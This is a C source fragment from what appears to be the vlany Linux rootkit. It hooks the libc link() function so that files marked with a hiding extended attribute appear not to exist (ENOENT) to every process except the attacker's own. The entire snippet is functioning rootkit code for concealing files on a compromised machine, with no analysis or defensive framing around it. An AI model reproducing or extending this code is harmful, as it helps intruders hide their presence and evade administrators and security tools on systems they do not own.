int link(const char *oldpath, const char *newpath)
{
    #ifdef DEBUG
        printf("[vlany] link() called\n");
    #endif

    HOOK(old_link, CLINK);

    if(owned()) return old_link(oldpath, newpath);

    if(hidden_xattr(oldpath) || hidden_xattr(newpath)) { errno = ENOENT; return -1; }

    return old_link(oldpath, newpath);
}
